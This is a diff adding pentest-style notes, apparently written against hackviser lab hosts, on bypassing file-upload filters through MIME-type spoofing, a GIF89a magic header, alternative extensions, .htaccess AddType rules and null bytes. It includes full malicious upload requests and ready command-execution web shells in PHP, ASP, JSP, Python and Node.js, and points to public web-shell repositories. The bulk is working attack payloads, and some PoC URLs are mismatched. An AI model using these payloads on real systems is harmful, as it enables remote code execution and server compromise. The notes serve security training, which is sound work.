@@ -79,3 +79,273 @@ The path of the uploaded file is provided on the screen, allowing shell commands
 
 
 [[./imgs/pwd.png]]
+
+* Filter bypass techniques
+When dealing with applications that have file upload vulnerabilities, it is not always possible to directly upload a malicious file. Some file extensions or MIME types are blocked using a blacklist.
+
+In such cases, it is necessary to bypass the filter in some way.
+
+This section will elaborate on these techniques:
+
+** MIME type bypass
+MIME Type is an internet standard that indicates the type of a file and tells the server how to handle it. Attackers can bypass security checks by specifying incorrect MIME types. Examples: image/jpeg, image/png, text/html, application/json.
+
+Some applications check the MIME types of uploaded files to block certain file types from being uploaded. However, by altering or manipulating the MIME types, these filters can be bypassed.
+
+When attempting to upload a .php file to an application that allows only image files, a denied file format error is encountered.
+
+[[./imgs/php.png]]
+
+The HTTP POST request sent to the server has been inspected using the Burp Suite Web Proxy software, and necessary manipulations have been performed.
+
+Below is an HTTP request where the attacker tries to upload a malicious PHP file as an image file ->
+#+begin_src python
+POST / HTTP/1.1
+Host: sunny-zombie.europe1.hackviser.space
+Content-Length: 354
+Cache-Control: max-age=0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6CZGdFhAqm0hjeeA
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+------WebKitFormBoundary6CZGdFhAqm0hjeeA
+Content-Disposition: form-data; name="input_image"; filename="cmd.php"
+Content-Type: text/php
+
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+------WebKitFormBoundary6CZGdFhAqm0hjeeA
+Content-Disposition: form-data; name="submit"
+
+
+------WebKitFormBoundary6CZGdFhAqm0hjeeA--
+#+end_src
+
+The attacker is attempting to upload a malicious PHP file. However, the MIME type is specified as text/php, and thus, the server does not accept this file.
+
+By changing the MIME type to image/png, the file upload is attempted again:
+: Content-Type: image/png
+
+With this change, the server might perceive the file as an image and allow the upload.
+
+[[./imgs/changed.png]]
+
+** File signature -Magic Header Bypass
+File signature (magic header) is a specific sequence of bytes that identifies the content of a file. Applications often check these signatures to determine the type of the file. By manipulating the file signature, these checks can be bypassed
+
+Below is an HTTP request where the attacker tries to upload a malicious PHP file:
+#+begin_src python
+POST / HTTP/1.1
+Host: included-aquagirl.europe1.hackviser.space
+Content-Length: 354
+Cache-Control: max-age=0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiXbT96o7HsUdrZoy
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+------WebKitFormBoundaryiXbT96o7HsUdrZoy
+Content-Disposition: form-data; name="input_image"; filename="cmd.php"
+Content-Type: text/php
+
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+------WebKitFormBoundaryiXbT96o7HsUdrZoy
+Content-Disposition: form-data; name="submit"
+
+
+------WebKitFormBoundaryiXbT96o7HsUdrZoy--
+#+end_src
+
+To bypass the filter, GIF89a is added to the beginning of the file, making it look like a GIF file. If the server checks for this signature, it might perceive the file as an image and allow the upload. This enables the attacker to upload malicious PHP code.
+
+#+begin_src php cmd.php
+GIF89a;
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+#+end_src
+
+
+Below is an HTTP request where the attacker manipulates the file signature and attempts to upload the same file:
+#+begin_src php
+POST / HTTP/1.1
+Host: included-aquagirl.europe1.hackviser.space
+Content-Length: 354
+Cache-Control: max-age=0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDZr5C5w7CxV3fYnf
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+------WebKitFormBoundaryDZr5C5w7CxV3fYnf
+Content-Disposition: form-data; name="input_image"; filename="cmd.php"
+Content-Type: text/php
+
+GIF89a;
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+------WebKitFormBoundaryDZr5C5w7CxV3fYnf
+Content-Disposition: form-data; name="submit"
+
+
+------WebKitFormBoundaryDZr5C5w7CxV3fYnf--
+#+end_src
+
+After sending the request, it is observed that the malicious file has been successfully uploaded.
+
+** File extension bypass
+After sending the request, it is observed that the malicious file has been successfully uploaded.
+
+- *PHP*: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .phar
+
+- *ASP*: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+
+- *JSP*: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+
+** ADding executable file extension with .htaccess
+The .htaccess file is used in web servers to define directory-based configurations and security settings. Using the .htaccess file on a web server, special file extensions can be defined, allowing them to be processed as PHP.
+
+In the first step, create and upload a web shell file with any desired extension. In this example, a file with the .bypass extension is created:
+
+#+begin_src php cmd.bypass
+<?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?>
+#+end_src
+
+In the second step, add the following line to the .htaccess file to ensure that files with the .bypass extension are processed as PHP:
+: AddType application/x-httpd-php .bypass
+
+** using NULL byte %00
+By using hidden characters such as a null byte (%00) in the file extension, change the extension (e.g., cmd.php%00.jpg).
+
+In some systems, case sensitivity might differ; therefore, write the file extension in uppercase (e.g., CMD.PHP).
+
+* web shell list
+or more effective command execution in file upload vulnerabilities, comprehensive web shells offering enhanced functionality can be used. These can be found on GitHub.
+
+The web shell repository located at github.com/tennc/webshell hosts web shell files for all programming languages. You can choose a shell based on your needs from this repository.
+
+** P0wny Shell
+P0wny Shell is a web shell developed for the PHP language. It is popular due to its simple usage. It can be easily downloaded and used from
+https://github.com/flozz/p0wny-shell.
+
+** Simple shell codes
+*PHP* ->
+#+begin_src php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+#+end_src
+
+*Poc(Proof Of Concept)* ->
+: http://example.com/shell.php?cmd=whoami
+
+*ASP* ->
+A simple web shell for ASP can be used to execute commands on the server:
+#+begin_src java
+<%
+If Request.QueryString("cmd") <> "" Then
+    Set objShell = Server.CreateObject("WScript.Shell")
+    Set objExec = objShell.Exec(Request.QueryString("cmd"))
+    Set objOutput = objExec.StdOut
+    Response.Write("<pre>" & objOutput.ReadAll() & "</pre>")
+End If
+%>
+#+end_src
+
+: http://example.com/shell.php?cmd=whoami
+
+*JSP* ->
+A simple web shell for JSP can be used to execute commands on the server:
+#+begin_src java
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    String s = "";
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    while ((s = sI.readLine()) != null) {
+        out.println(s);
+    }
+}
+%>
+#+end_src
+
+: http://example.com/shell.php?cmd=whoami
+
+*Python* ->
+A simple web shell for Python can be used to execute commands on the server:
+#+begin_src python
+import os
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/shell', methods=['GET'])
+def shell():
+    cmd = request.args.get('cmd')
+    if cmd:
+        output = os.popen(cmd).read()
+        return f"<pre>{output}</pre>"
+    return "<pre>No command provided</pre>"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+#+end_src
+
+: http://example.com/shell.php?cmd=whoami
+
+*NodeJS* ->
+A simple web shell for Node.js can be used to execute commands on the server:
+#+begin_src javascript
+const express = require('express');
+const { exec } = require('child_process');
+
+const app = express();
+
+app.get('/shell', (req, res) => {
+  const cmd = req.query.cmd;
+  if (cmd) {
+    exec(cmd, (error, stdout, stderr) => {
+      if (error) {
+        res.send(`<pre>${stderr}</pre>`);
+        return;
+      }
+      res.send(`<pre>${stdout}</pre>`);
+    });
+  } else {
+    res.send('<pre>No command provided</pre>');
+  }
+});
+
+app.listen(8080, '0.0.0.0', () => {
+  console.log('Web shell running on port 8080');
+});
+#+end_src
+
+: http://example.com/shell.php?cmd=whoami
